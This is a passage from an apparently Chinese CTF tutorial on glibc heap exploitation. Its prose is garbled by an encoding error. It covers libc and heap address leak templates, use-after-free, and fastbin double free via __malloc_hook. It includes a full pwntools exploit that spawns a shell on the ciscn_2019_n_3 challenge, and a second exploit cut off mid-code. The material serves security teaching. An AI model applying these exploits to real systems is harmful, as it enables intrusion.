<h5 id="5ï¼‰nextchunkä¸ä¸ºtop-chunk"><a href="#5ï¼‰nextchunkä¸ä¸ºtop-chunk" class="headerlink" title="5ï¼‰nextchunkä¸ä¸ºtop chunk"></a>5ï¼‰nextchunkä¸ä¸ºtop chunk</h5><p>è‹¥nextchunkä¸ä¸ºtop chunkï¼Œåˆ™<strong>é¦–å…ˆä¼šæ£€æŸ¥nextchunkçš„ç‰©ç†ç›¸é‚»é«˜åœ°å€chunkçš„PREV_INUSEæ ‡å¿—ä½</strong></p>
<ul>
<li><strong>è‹¥ä¸ä¸º0åˆ™ä¼šæ¸…é™¤nextchunkçš„PREV_INSUEä½</strong></li>
</ul>
<p><img src="https://i.loli.net/2021/01/23/YVaFRKonG4WBuXM.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<ul>
<li><strong>è‹¥ä¸º0åˆ™ä½¿ç”¨unlinkå°†nextchunkä»binsä¸­å–å‡º</strong></li>
</ul>
<p><img src="https://i.loli.net/2021/01/23/LEBAKhTbSMlCcVr.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ¥ä¸‹æ¥ä¼š<strong>å°†è¯¥chunkæ”¾å…¥unsorted binä¸­ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯åœ¨è¿™é‡Œä½¿ç”¨çš„æ˜¯å¤´æ’æ³•ä½¿å…¶æˆä¸ºunsorted binçš„å¤´ç»“ç‚¹</strong></p>
<p><img src="https://i.loli.net/2021/01/23/BNJIPrGL9eTvX8U.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ¥ä¸‹æ¥ä¼šæ£€æŸ¥chunkæœ€ç»ˆçš„å¤§å°ï¼Œ<strong>è‹¥æ˜¯sizeä¸å¤„äºsmallbinsèŒƒå›´å†…åˆ™ä¼šè®¾ç½®å…¶fd_nextsizeä¸bk_nextsizeä¸ºNULL</strong></p>
<p>æœ€åï¼Œ<strong>è®¾ç½®è¯¥chunkçš„PREV_INUSEä½ä¸º1</strong>ï¼Œè®¾ç½®<strong>å½“å‰æƒ…å†µä¸‹çš„ç‰©ç†ç›¸é‚»chunkçš„prevsizeåŸŸä¸ºè¯¥chunkçš„size</strong></p>
<p><img src="https://i.loli.net/2021/01/23/5b7qYPjO1AmXkyF.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h4 id="â‘¢æ£€æŸ¥é“¾è¡¨ä¸­çš„ä¸‹ä¸€ä¸ªchunkï¼Œä¸ä¸ºNULLåˆ™ç»§ç»­æ–°ä¸€è½®å¾ªç¯"><a href="#â‘¢æ£€æŸ¥é“¾è¡¨ä¸­çš„ä¸‹ä¸€ä¸ªchunkï¼Œä¸ä¸ºNULLåˆ™ç»§ç»­æ–°ä¸€è½®å¾ªç¯" class="headerlink" title="â‘¢æ£€æŸ¥é“¾è¡¨ä¸­çš„ä¸‹ä¸€ä¸ªchunkï¼Œä¸ä¸ºNULLåˆ™ç»§ç»­æ–°ä¸€è½®å¾ªç¯"></a>â‘¢æ£€æŸ¥é“¾è¡¨ä¸­çš„ä¸‹ä¸€ä¸ªchunkï¼Œä¸ä¸ºNULLåˆ™ç»§ç»­æ–°ä¸€è½®å¾ªç¯</h4><p>è™½ç„¶chunkæŒ‡é’ˆå¯èƒ½åœ¨åˆå¹¶ä¸­è¢«ä¿®æ”¹ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨å‰é¢å·²ç»ä¿å­˜äº†å…¶fdï¼Œè‹¥ä¸ä¸ºNULLåˆ™è¿›è¡Œä¸‹ä¸€è½®å¾ªç¯ï¼Œæ•…å¯ä»¥ç»§ç»­éå†é“¾è¡¨çš„è¿›ç¨‹</p>
<h1 id="0x04-åŸºç¡€çš„åˆ©ç”¨æ–¹å¼"><a href="#0x04-åŸºç¡€çš„åˆ©ç”¨æ–¹å¼" class="headerlink" title="0x04.åŸºç¡€çš„åˆ©ç”¨æ–¹å¼"></a>0x04.åŸºç¡€çš„åˆ©ç”¨æ–¹å¼</h1><h2 id="ä¸€ã€åœ°å€æ³„éœ²"><a href="#ä¸€ã€åœ°å€æ³„éœ²" class="headerlink" title="ä¸€ã€åœ°å€æ³„éœ²"></a>ä¸€ã€åœ°å€æ³„éœ²</h2><p>ä¸ ret2libc ç›¸åŒï¼ŒCTFçš„å †é¢˜ä¸­å¾€å¾€ä¸ä¼šç›´æ¥ç»™æˆ‘ä»¬åé—¨å‡½æ•°ï¼ŒåŒæ—¶åœ°å€éšæœºåŒ–ä¿æŠ¤å¾€å¾€ä¹Ÿéƒ½æ˜¯å¼€ç€çš„ï¼ˆå‡†ç¡®åœ°è¯´ï¼Œå‡ ä¹æ‰€æœ‰çš„å †é¢˜éƒ½æ˜¯<strong>ä¿  æŠ¤  å…¨  å¼€</strong>ï¼‰ï¼Œæ•…æˆ‘ä»¬ä»ç„¶éœ€è¦åˆ©ç”¨ libc ä¸­çš„ gadget ä»¥è·å¾— flag</p>
<h3 id="bins-libc-åŸºå€"><a href="#bins-libc-åŸºå€" class="headerlink" title="bins - libc åŸºå€"></a>bins - libc åŸºå€</h3><p>ï¼ˆé™¤ fastbin ä¸ tcache ä»¥å¤–ï¼‰bins ä¸ç©ºé—² chunk é—´æ„æˆåŒå‘é“¾è¡¨ç»“æ„ï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹æ€§æˆ‘ä»¬ä¾¿å¯ä»¥æ³„æ¼å‡ºmain_arena çš„åœ°å€ï¼Œè¿›è€Œæ³„æ¼å‡º libc çš„åŸºå€</p>
<p>gdb è°ƒè¯•å¯ä»¥æ–¹ä¾¿æˆ‘ä»¬çŸ¥é“ chunk ä¸Šæ‰€è®°è½½çš„ä¸ main_arena é—´çš„åç§»</p>
<p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åˆ©ç”¨ unsorted bin ä¸­çš„ chunk æ³„éœ² libc åœ°å€ï¼Œå…¶ä¸ main_arena é—´è·ç¦»ä¸º 0x58&#x2F;0x60(libc2.26 and upï¼Œ with tcache)ï¼Œè€Œ main_arena ä¸ __malloc_hook é—´åœ°å€ç›¸å·®0x10ï¼Œæ•…æœ‰å¦‚ä¸‹æ¿å­ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x60</span> <span class="hljs-comment"># tcache</span><br>main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x58</span> <span class="hljs-comment"># no tcache</span><br>main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - offset <span class="hljs-comment"># other condition(not unsorted bin leak)</span><br>malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br></code></pre></td></tr></table></figure>

<p>è¿™ç§åˆ©ç”¨çš„æ–¹å¼å¯ä»¥æ˜¯é€šè¿‡å‚æ‚¬æŒ‡é’ˆæ‰“å°binsä¸­chunkå†…å®¹ï¼Œä¹Ÿå¯ä»¥æ˜¯é€šè¿‡é€å…¥ bins åå†åˆ†é…å›æ¥åæ‰“å° chunk ä¸Šæ®‹ç•™çš„è„æ•°æ®è·å¾—</p>
<h3 id="IO-FILE-libc-åŸºå€"><a href="#IO-FILE-libc-åŸºå€" class="headerlink" title="_IO_FILE - libc åŸºå€"></a>_IO_FILE - libc åŸºå€</h3><p>ä¸»è¦é’ˆå¯¹æ²¡æœ‰æ‰“å°å‡½æ•°æˆ–è€…æ‰“å°æ¬¡æ•°ä¸å¤Ÿï¼ˆæ¯”å¦‚è¯´åªèƒ½è¾“å‡ºä¸€æ¬¡ä½†æ˜¯å¾—å…ˆæ³„éœ²å †åŸºå€çš„libc2.32ä¸€ç±»çš„ï¼‰çš„æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŠ«æŒ<code>_IO_2_1_stdout_ </code>ç»“æ„ä½“ä»¥æ³„æ¼å‡º libc çš„åœ°å€ï¼Œç”±äº main_arena ä¸ <code>_IO_2_1_stdout_</code> åœ¨ç›¸é è¿‘çš„å‡ ä¸ªé¡µå†…ï¼Œæ•…æˆ‘ä»¬å¯ä»¥é€šè¿‡ partial overwrite çš„æ–¹å¼ä»¥ 1&#x2F;16 çš„æ¦‚ç‡å»æ’ _IO_2_1_stdout_ï¼Œä¹‹åä¿®æ”¹è¯¥ç»“æ„ä½“ä»¥ä½¿å¾—è¯¸å¦‚ <code>puts</code> è¿™æ ·çš„å‡½æ•°<strong>è¯¯è®¤ä¸ºæœ‰æœªè¾“å‡ºå†…å®¹</strong>ä»è€Œæ‰“å°å‡º libc ç›¸å…³åœ°å€ï¼Œå¯ä»¥é€šè¿‡ gdb è¿›è¡Œè°ƒè¯•è·å¾—æ³„éœ²å‡ºçš„åœ°å€ç›¸å¯¹äº libc åŸºå€çš„åç§»</p>
<p>æœ¬å†…å®¹æ”¾åˆ°åé¢çš„ <code>IO_FILE exploit</code> ç« èŠ‚å†è¡Œè¯¦ç»†é˜è¿°</p>
<h3 id="tcache-key-å †åŸºå€ï¼ˆonly-libc2-29-and-upï¼‰"><a href="#tcache-key-å †åŸºå€ï¼ˆonly-libc2-29-and-upï¼‰" class="headerlink" title="tcache key - å †åŸºå€ï¼ˆonly libc2.29 and upï¼‰"></a>tcache key - å †åŸºå€ï¼ˆonly libc2.29 and upï¼‰</h3><p>tcache key æ‰€ç”¨çš„å€¼ä¾¿æ˜¯ tcache ç»“æ„ä½“æœ¬èº«çš„åœ°å€ï¼Œæ•…è‹¥æˆ‘ä»¬èƒ½å¤Ÿæ‰“å° tcache key ï¼Œå°±èƒ½ç›´æ¥è·å¾—å †åŸºå€</p>
<p>å¯¹äºå¸¸è§„çš„å…¶ä»–å †åœ°å€ï¼Œæˆ‘ä»¬è¿˜æœ‰å¦‚ä¸‹æ¿å­ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">heap_leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>heap_base = heap_leak - <span class="hljs-number">0x290</span> - <span class="hljs-number">0x10</span> - offset <span class="hljs-comment"># C</span><br>heap_base = heap_leak - <span class="hljs-number">0x11c10</span> - <span class="hljs-number">0x290</span> - <span class="hljs-number">0x10</span> - offset <span class="hljs-comment"># C++ with string cin cout</span><br></code></pre></td></tr></table></figure>

<p>éœ€è¦æ³¨æ„çš„æ˜¯ä¸åŒç‰ˆæœ¬çš„libcä¸‹è¿™ä¸ªåç§»ï¼ˆ0x290ï¼Œlibc2.30 and upï¼›0x250ï¼Œbelow the libc 2.30ï¼‰å¹¶ä¸ä¸€å®šæ˜¯ç›¸åŒçš„</p>
<h3 id="safe-linking-in-tcache-å †åŸºå€ï¼ˆonly-libc2-32-and-upï¼‰"><a href="#safe-linking-in-tcache-å †åŸºå€ï¼ˆonly-libc2-32-and-upï¼‰" class="headerlink" title="safe-linking in tcache - å †åŸºå€ï¼ˆonly libc2.32 and upï¼‰"></a>safe-linking in tcache - å †åŸºå€ï¼ˆonly libc2.32 and upï¼‰</h3><p>åœ¨ tcache çš„ä¸€ä¸ª entry ä¸­æ”¾å…¥ç¬¬ä¸€ä¸ª chunk æ—¶ï¼Œå…¶åŒæ ·ä¼šå¯¹è¯¥ entry ä¸­çš„ â€œchunkâ€ ï¼ˆNULLï¼‰è¿›è¡Œå¼‚æˆ–è¿ç®—åå†™å…¥åˆ°å°†æ”¾å…¥ tcache ä¸­çš„ chunk çš„ <code>fd</code> å­—æ®µï¼Œè‹¥æ˜¯æˆ‘ä»¬èƒ½å¤Ÿæ‰“å°è¯¥ free chunk çš„fdå­—æ®µï¼Œ<strong>ä¾¿èƒ½å¤Ÿç›´æ¥è·å¾—æœªç»å¼‚æˆ–è¿ç®—çš„å †ä¸Šç›¸å…³åœ°å€</strong></p>
<h2 id="äºŒã€use-after-free"><a href="#äºŒã€use-after-free" class="headerlink" title="äºŒã€use after free"></a>äºŒã€use after free</h2><p>use after free å³å¯¹äºå‚æ‚¬æŒ‡é’ˆçš„åˆ©ç”¨ï¼Œåœ¨è¿™ç±»é¢˜ç›®ä¸­å¾€å¾€é¢˜ç›®åœ¨é€»è¾‘è®¾è®¡ä¸Šä¼šåœ¨freeä¸€ä¸ªå †å—åç•™ä¸‹ä¸€ä¸ªå‚æ‚¬æŒ‡é’ˆï¼Œæœªå°†å…¶ç½® NULL ï¼Œä½¿å¾—è¯¥å †å—è™½ç„¶è¢« free äº†ï¼Œä½†æ˜¯æˆ‘ä»¬ä»ç„¶èƒ½å¤Ÿä½¿ç”¨è¯¥å †å—</p>
<p>å¸¸è§çš„å‚æ‚¬æŒ‡é’ˆåˆ©ç”¨æœ‰ï¼š</p>
<ul>
<li>æ³„éœ²æ•°æ®</li>
<li>double free</li>
<li>æ„é€ ä»»æ„åœ°å€å†™</li>
</ul>
<h4 id="ä¾‹é¢˜ï¼šciscn-2019-n-3-Use-After-Free"><a href="#ä¾‹é¢˜ï¼šciscn-2019-n-3-Use-After-Free" class="headerlink" title="ä¾‹é¢˜ï¼šciscn_2019_n_3 - Use After Free"></a>ä¾‹é¢˜ï¼šciscn_2019_n_3 - Use After Free</h4><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NXå’Œcanary</p>
<p><img src="https://i.loli.net/2021/01/31/neG2dQumBhsrzLD.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œå¤§æ¦‚æ˜¯ä¸€é“æœ‰ç€åˆ†é…ã€é‡Šæ”¾ã€æ‰“å°å †å—åŠŸèƒ½çš„ç¨‹åº</p>
<p><img src="https://i.loli.net/2021/02/01/rcKNdhuEGpJb1CH.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é‡Šæ”¾å †å—æ—¶ç”¨çš„æ˜¯å †å—ä¸Šçš„å‡½æ•°æŒ‡é’ˆ</p>
<p><img src="https://i.loli.net/2021/02/01/HloCX5q9FbcuvRf.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åœ¨é‡Šæ”¾å †å—åä¸ä¼šå°†å †å—æŒ‡é’ˆç½®NULLï¼Œ<strong>å­˜åœ¨UAFæ¼æ´</strong></p>
<p><img src="https://i.loli.net/2021/02/01/lBSJXRweGYZjWMN.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://i.loli.net/2021/02/01/dQPegf7Bs9NVhxX.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç”±äºç¨‹åºä¸­å­˜åœ¨systemå‡½æ•°ï¼Œæ•…è€ƒè™‘é€šè¿‡UAFè¦†å†™å †å—æŒ‡é’ˆä¸ºsystemåæ‰§è¡Œ<code>system(&quot;sh&quot;)</code>ä»¥get shell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br>p = process(<span class="hljs-string">&#x27;./ciscn_2019_n_3&#x27;</span>) <span class="hljs-comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, 27248)</span><br>e = ELF(<span class="hljs-string">&#x27;./ciscn_2019_n_3&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">command: <span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;CNote&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(command).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">index: <span class="hljs-built_in">int</span>, value: <span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Type&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Value&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(value).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">index: <span class="hljs-built_in">int</span>, length: <span class="hljs-built_in">int</span>, content</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Type&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Length&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(length).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Value &gt; &quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index: <span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index: <span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Index&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    new(<span class="hljs-number">0</span>, <span class="hljs-number">0x114</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 0</span><br>    new(<span class="hljs-number">1</span>, <span class="hljs-number">0x114</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 1</span><br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">1</span>)<br>    new(<span class="hljs-number">2</span>, <span class="hljs-number">0xc</span>, <span class="hljs-string">b&#x27;sh\x00\x00&#x27;</span> + p32(e.sym[<span class="hljs-string">&#x27;system&#x27;</span>])) <span class="hljs-comment"># idx2, overlapping with idx 0</span><br>    free(<span class="hljs-number">0</span>)<br>    p.interactive()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/02/01/eEQf6L8dWs2hmk7.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h3 id="â‘ double-free"><a href="#â‘ double-free" class="headerlink" title="â‘ double free"></a>â‘ double free</h3><p>double free åˆ™æ˜¯ use after free ä¸­æœ€ä¸ºçƒ­é—¨çš„ä¸€ç§åˆ©ç”¨æ–¹å¼ï¼Œå½“åŒä¸€ä¸ª chunk åœ¨å †ç®¡ç†å™¨ä¸­åŒæ—¶å­˜åœ¨ä¸¤ä»½å‰¯æœ¬æ—¶ï¼Œæˆ‘ä»¬å°†å…¶ä¸­ä¸€ä¸ªå †å—åˆ†é…å›æ¥å¹¶æ”¹å†™å…¶ fd æŒ‡é’ˆï¼Œå½“è¯¥ chunk å†ä¸€æ¬¡è¢«å–å‡ºæ—¶ï¼Œç•™åœ¨å †ç®¡ç†å™¨ä¸­çš„ chunk åœ°å€ä¾¿æ˜¯ç”±æˆ‘ä»¬å†™å…¥çš„ fake chunk åœ°å€ï¼Œæ­¤æ—¶æˆ‘ä»¬å†è¡Œåˆ†é…ä¾¿å¯ä»¥åœ¨æˆ‘ä»¬æ‰€å¸Œæœ›çš„åœ°å€è·å¾—ä¸€ä¸ª chunkï¼Œ<strong>å®ç°ä»»æ„åœ°å€å†™</strong></p>
<h4 id="I-fastbin-double-free"><a href="#I-fastbin-double-free" class="headerlink" title="I.fastbin double free"></a>I.fastbin double free</h4><p>ç”±äº fastbin å¯¹äº double free çš„æ£€æŸ¥è¾ƒä¸ºç¨€æ¾ï¼Œæ•…é€šå¸¸è€ƒè™‘é€šè¿‡ fastbin double free è¿›è¡Œä»»æ„åœ°å€å†™</p>
<p>fastbin ä»…ä¼šæ£€æŸ¥é“¾è¡¨çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ•…ä»…éœ€è¦æ„é€  <code>A-&gt;B-&gt;A</code> çš„ free() é“¾å³å¯å®Œæˆ fastbin double freeï¼Œé€šè¿‡è¿™æ ·çš„æ–¹å¼æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ fastbin è¿›è¡Œ<strong>æœ‰é™åœ°å€å†™</strong>ï¼Œè¿™ç§åˆ©ç”¨æ–¹å¼ä¹Ÿå«åš <strong>fastbin dup</strong></p>
<h5 id="sizeæ£€æŸ¥"><a href="#sizeæ£€æŸ¥" class="headerlink" title="sizeæ£€æŸ¥"></a>sizeæ£€æŸ¥</h5><p>åœ¨mallocå–å‡ºfastbinä¸­çš„chunkæ—¶ä¼šæ£€æŸ¥å…¶sizeå­—æ®µï¼Œ<strong>è‹¥ä¸å…¶å¯¹åº”ä¸‹æ ‡ä¸ç›¸ç¬¦åˆ™ä¼šå¼•å‘ç¨‹åºabortï¼Œé™åˆ¶äº†æˆ‘ä»¬æ‰€èƒ½æ„é€ fake chunkçš„ä½ç½®</strong>ï¼Œä½†è¯¥sizeæ£€æŸ¥<strong>ä¸ä¼šæ£€æŸ¥æ ‡å¿—ä½</strong></p>
<h5 id="malloc-hook-0x23"><a href="#malloc-hook-0x23" class="headerlink" title="__malloc_hook - 0x23"></a>__malloc_hook - 0x23</h5><p>fastbin attackä¸­åˆ†é…åˆ°__malloc_hooké™„è¿‘çš„fake chunké€šå¸¸éƒ½æ˜¯malloc(0x60)ï¼Œä¹Ÿå°±æ˜¯size &#x3D;&#x3D; 0x71ï¼Œè¿™æ˜¯å› ä¸ºåœ¨__malloc_hook - 0x23è¿™ä¸ªåœ°å€ä¸Šfake chunkçš„SIZEçš„ä½ç½®åˆšå¥½æ˜¯<code>0x7f</code>ï¼Œæ»¡è¶³äº†ç»•è¿‡fastbinçš„sizeæ£€æŸ¥çš„è¦æ±‚</p>
<p><img src="https://i.loli.net/2020/12/03/GBrOqIdPnDluXhb.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>è¿™æ˜¯ä¸€ä¸ªååˆ†ä¼˜é›…çš„ä½ç½®ï¼Œå› ä¸ºæ— è®ºä½•æ—¶è¿™ä¸ªä½ç½®ä¸Šçš„å€¼éƒ½æ˜¯ 0x7fï¼ŒåŒæ—¶ç¦» __malloc_hook ä»…æœ‰ 0x23 å­—èŠ‚çš„è·ç¦»ï¼Œæˆ‘ä»¬åœ¨æ„é€  size ä¸º 0x71 çš„ fake fastbin chunk æ—¶è‹¥æ˜¯æ„é€ åˆ°è¿™ä¸ªä½ç½®åˆ™å®Œå…¨ä¸éœ€è¦æ‹…å¿ƒ size æ£€æŸ¥çš„é—®é¢˜ï¼Œå› æ­¤ __malloc_hook - 0x23 ä¹Ÿå°±æˆä¸ºäº†æ„é€  fake fastbin chunk çš„â€œçƒ­é—¨åœ°å¸¦â€</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯åœ¨libc2.31ç‰ˆæœ¬ä¸­è¿™ä¸ªä½ç½®ä¸Šçš„æ•°æ®å·²ç»ä¸å†æ˜¯0x7fï¼Œæ•…æˆ‘ä»¬éœ€è¦<code>å…·ä½“é—®é¢˜å…·ä½“åˆ†æ,å…·ä½“ç‰ˆæœ¬å…·ä½“è°ƒè¯•</code></p>
<p><img src="https://i.loli.net/2021/02/09/uqTerVoWkSvXM3E.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h5 id="ä¾‹é¢˜ï¼šbytectf2019-mulnote-use-after-free-fastbin-attack-one-gadget"><a href="#ä¾‹é¢˜ï¼šbytectf2019-mulnote-use-after-free-fastbin-attack-one-gadget" class="headerlink" title="ä¾‹é¢˜ï¼šbytectf2019 - mulnote - use after free + fastbin attack + one_gadget"></a>ä¾‹é¢˜ï¼šbytectf2019 - mulnote - use after free + fastbin attack + one_gadget</h5><p><a href="/download/bytectf2019/mulnote.zip" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">ç‚¹å‡»ä¸‹è½½-mulnote.zip</a></p>
<p>ä¸€é“æœ‰ç€åˆ†é…ã€ç¼–è¾‘ã€æ‰“å°ã€é‡Šæ”¾å †å—åŠŸèƒ½çš„é¢˜ç›®</p>
<p>æ¼æ´ç‚¹ä¸»è¦åœ¨äºé‡Šæ”¾å‡½æ•°çš„ç­–ç•¥ï¼Œå¯¹äºæ¯ä¸€æ¬¡å †å—çš„é‡Šæ”¾ï¼Œå…¶éƒ½ä¼šèµ·ä¸€ä¸ªæ–°çš„çº¿ç¨‹æ‰§è¡Œé‡Šæ”¾å †å—æ“ä½œ</p>
<p><img src="https://i.loli.net/2021/02/24/oXgdMnHJvs6cxUO.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ¯ä¸€ä¸ªçº¿ç¨‹éƒ½ä¼šè°ƒç”¨<code>start_routine</code>å‡½æ•°å®Œæˆæœ€ç»ˆçš„æ“ä½œï¼Œæ¼æ´ç‚¹å°±åœ¨äº<code>free()</code>ä¹‹åçº¿ç¨‹ä¼šå…ˆä¼‘çœ å‡ ç§’åå†å°†å †å—æŒ‡é’ˆç½®é›¶ï¼Œè‹¥æ˜¯æˆ‘ä»¬åœ¨è¿™æ®µæ—¶é—´å†…è¿›è¡Œå…¶ä»–æ“ä½œï¼Œä¾¿å¯ä»¥double free + åœ°å€æ³„éœ²ä¸€å¥—å¸¦èµ°</p>
<p><img src="https://i.loli.net/2021/02/24/2V4ELnQedAwPaSZ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>libc2.23ï¼Œæ²¡æœ‰tcacheï¼Œè€ƒè™‘fastbin double freeåŠ«æŒ__malloc_hookä¸ºone_gadgetä»¥get shell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 